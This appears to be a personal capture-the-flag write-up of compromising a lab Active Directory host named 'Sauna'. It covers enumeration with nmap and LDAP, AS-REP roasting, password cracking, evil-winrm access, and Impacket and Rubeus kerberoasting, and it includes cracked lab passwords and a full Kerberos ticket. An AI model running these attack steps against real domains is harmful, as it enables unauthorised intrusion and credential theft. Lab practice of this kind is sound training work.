
AD

```sh
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-31 22:11:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-31T22:12:20
|_  start_date: N/A

```


okay so there a web page


![[Pasted image 20260731171833.png]]


didnt find anything intersting all post give 405 method not allowed


![[Pasted image 20260731172900.png]]

nada

same here 

![[Pasted image 20260731172916.png]]

nada

what am i missing >><<>><<>><<>><><>>,


check port 5985 its http also 

also nothing



checking ldap 

![[Pasted image 20260803095256.png]]

potential user: 

```sh
# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```


so i collected several names from the website 


used username-anarchy to create a wordlist

![[Pasted image 20260803120415.png]]

used kerbrute to check which ones are actually valid 


![[Pasted image 20260803120155.png]]

```sh
2026/08/03 12:00:50 >  [+] VALID USERNAME:	 hsmith@EGOTISTICAL-BANK.LOCAL
2026/08/03 12:00:50 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL

```


we have 2 usernames 


found a asproastable  user

![[Pasted image 20260803122814.png]]


trying to crack it 
![[Pasted image 20260803122913.png]]


 fsmith / Thestrokes23


we have a valid user in the domain 


![[Pasted image 20260803131423.png]]

![[Pasted image 20260803131444.png]]


 > winpeas 
 
![[Pasted image 20260803133527.png]]

 svc_loanmanager / Moneymakestheworldgoround!

![[Pasted image 20260803134003.png]]


lets check that using impacket it didnt work for some reason lets try in rubeus

kerberoast didnt work since i assume we were authenticated using ntlm  

ask for my ticket and lets try again  without /nowrap  just ptt
![[Pasted image 20260803141448.png]]



```d
That error (`AcquireCredentialsHandle error: -2146893042`) confirms it — the evil-winrm session fundamentally can't do the Kerberos
```




after basically checking the impacket error i notced this 

```sh
GetUserSPNs.py EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -dc-ip 10.129.40.182 -request
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 06:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
[-] Principal: EGOTISTICAL-BANK.LOCAL\HSmith - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

the clock skew too great since th date in the DC is 2 hours earlier than mine 


now back to to winrm lets try to inject the ticket with the command 

```sh

*Evil-WinRM* PS C:\Users\FSmith> .\rubeus.exe kerberoast /creds:EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 /domain:EGOTISTICAL-BANK.LOCAL /dc:SAUNA.EGOTISTICAL-BANK.LOCAL  /rc4opsec /ticket:doIFajCCBWagAwIBBaEDAgEWooIEYzCCBF9hggRbMIIEV6ADAgEFoRgbFkVHT1RJU1RJQ0FMLUJBTksuTE9DQUyiKzApoAMCAQKhIjAgGwZrcmJ0Z3QbFkVHT1RJU1RJQ0FMLUJBTksuTE9DQUyjggQHMIIEA6ADAgESoQMCAQKiggP1BIID8agkJOfzQsxpg1AigSpN7NbMrlmtXPJdpwY1E+lslbvlwkdrSYxM5FpzeANCB8emBhXvwZd9pLX8GBLmVOpVEdXQcKk+lfiKTVZ9OfmPj8Z+EJio/7I3U3Y9royo3v606qShikHeaqHHS1VT1u8KdutovpSABzRFYO/KWCu1sSrvDXfNjJsbROIoXafGBmoKqo2pmXxx6s57yXr4na412Su3jQ/a29QEkDFxLnf/G56if7YwcUvj8WF4P2qacs385ULk4N0C0GGHp/d5zP/SxSnnZ951JHCKz4SZDxi0P6zen6yLULdmXL23S8oWuvO+7eithDJBaPgNWysA4tzby4PzASeBdPbg+tpZ/63AdQYnwAIdXWRso8IMc/B8+GBCBun+S1GNj4hij0KJPIN7p1is6LXMaNcZkJ+auPzUKXBKyaK8jhxmbfBxm1LMXZVshMyGD+9/gm2M9NEUhhz9nAotq7z8GwA38+KPT1FXE75/GTT0FWIGRJGpeBVCcw8XjiZlPJe7vOUv5YskQTkSqaqow9BISsyeY/btFqyszp/Aj1itOjLQ6mPtUQpZJSiL8rRRo/SnE/vLNLSR33Xrd0maSeo20JmVtWLMimWRGpQipFIb2cPiUpgW8SVWa1SPyTvWUBRgEhMHFMZGB70nO1ShHBhaMrcZLmDAv53Ch+IHZGtVE9Ss3TVrkF+tK+3fkhB2fuCSNJyDbZvjQwCnBg+12ehs8kFufv3pQjf34YfR2JykYwVb0TavJz364WWAcmc2s6x/RY6U9DkNXX5Bj28sWxeeW+sG6L+5UbxS8X0Xz9VpiWcGvLNmGla3BT6cvGxaL0oQF9yPhfSjEgmS+Kd/zSTkXb9RmPitlVDFQB5U/LGLBpv1ljQp/MFJBsJsGUT7L/VCPakqLfWnqGx3bGdf/czE08rM/9rOQ8geD81/fa/MMyyEAvz7ypYVkRaUEPLqKfU/eQN+E+egn2KR8L/g/tYdvZZ5iLCwI+iLpZV1FZlUmLU01lqg5HQUCbj0wxpZiwEpdz+xJqWKZXQieZpdUjxOjB+RpylmKvKv7T5qR1Z9lBs7KdW5jQ8Q1w1NWyhIl3de9zjEtkfbM1Cckhn6LiDeLY267J2Am+A7NC0t37JjpFWcCtN9RHobjvFaKjQR9dfM9Mao1pzOMN0FCFIWj0bTLc/iO8/D8yJLtmpJtUGrVztWfG1yYIo53nABhv6rsNMqO3Jni2+OVvG/+DuTlqPv6yZgNpfwCSJlDh0xyToLL9sSq8+dL3ZaD3N2mpCsNwErARAwjlBoeqMpfivOwH+a2Pq2LW8P0ssl6AAfUvrEuwqOY+pmIUVI6idy6VOjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aAbMBmgAwIBF6ESBBAVYq4h7HohhosYi8FPHC56oRgbFkVHT1RJU1RJQ0FMLUJBTksuTE9DQUyiEzARoAMCAQGhCjAIGwZmc21pdGijBwMFAEDhAAClERgPMjAyNjA4MDMxOTUzMzVaphEYDzIwMjYwODA0MDU1MzM1WqcRGA8yMDI2MDgxMDE5NTMzNVqoGBsWRUdPVElTVElDQUwtQkFOSy5MT0NBTKkrMCmgAwIBAqEiMCAbBmtyYnRndBsWRUdPVElTVElDQUwtQkFOSy5MT0NBTA== /outfile:hashes.txt

```

![[Pasted image 20260803150258.png]]

we got a ticket not that when we are requesting ticket and basically the ticket says no creds try to inject it in /ptt if it does work inject the ticket with it .



![[Pasted image 20260803150244.png]]

![[Pasted image 20260803150350.png]]

hsmith / Thestrokes23

but i found a deadend with this user


lets go back to another way and check the bloodhound 

**A DCSync right owned by a _computer_ is only usable if you're SYSTEM on that computer.** That's the catch.

so we see that we have 

![[Pasted image 20260803152339.png]]

the previously leaked from winpeas lets check that



![[Pasted image 20260803152834.png]]


![[Pasted image 20260803153039.png]]